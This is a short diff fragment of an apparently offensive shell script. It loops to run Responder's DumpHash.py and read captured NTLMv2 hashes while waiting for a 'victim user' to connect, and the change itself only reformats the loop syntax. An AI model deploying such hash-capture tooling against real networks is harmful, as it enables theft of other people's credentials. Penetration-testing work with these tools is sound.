@@ -20,8 +20,7 @@ echo "Tools now running"
 
 # Now we wait for a victim user to connect, so we keep running the Dumper command every second
 loop=1
-while [ $loop ]
-do
+while [ $loop ]; do
 	# Run the Dumper command
 	cd /usr/share/responder && python DumpHash.py >/dev/null
 	output=$(cat /usr/share/responder/DumpNTLMv2.txt)
